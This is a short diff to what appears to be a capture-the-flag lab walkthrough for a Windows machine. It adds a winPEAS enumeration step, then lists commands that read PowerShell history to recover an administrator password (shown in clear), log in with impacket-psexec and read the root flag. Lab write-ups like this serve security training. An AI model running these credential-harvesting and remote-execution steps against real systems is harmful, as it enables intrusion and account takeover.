@@ -37,12 +37,14 @@ Steps:
 
 17. cat C:\Users\sql_Svc\Desktop\user.txt
 
-18. cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
+18. cd C:/Users/sql_svc/Downlaods; ./winPEASx64.exe
+
+19. cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
 
     user:administrator pass:MEGACORP_4dm1n!!
 
-19. impacket-psexec administrator@10.129.95.187
-20. powershell
-21. cat C:\Users\Administrator\Desktop\root.txt
+20. impacket-psexec administrator@10.129.95.187
+21. powershell
+22. cat C:\Users\Administrator\Desktop\root.txt
 
 
